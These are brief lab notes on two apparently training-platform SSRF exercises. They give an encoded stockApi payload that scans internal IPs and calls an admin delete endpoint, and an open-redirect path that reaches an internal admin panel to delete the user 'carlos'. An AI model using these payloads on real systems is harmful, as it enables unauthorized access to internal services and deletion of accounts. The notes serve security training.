# Lab: Basic SSRF against another back-end system

Encoding the URL:
```
http://192.168.0.32:8080/admin/delete?username=carlos
```

```
POST /product/stock HTTP/1.1
..
stockApi=http%3A%2F%2F192.168.0.§1§%3A8080%2f%61%64%6d%69%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73
```

# Lab: SSRF with filter bypass via open redirection vulnerability

need to change the stockAPI in the stock checker to:
```
/product/nextProduct?path=http://192.168.0.12:8080/admin
```
In order for the server to retrieve the admin panel, then we want to send the delete request with the stock checker
```
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```
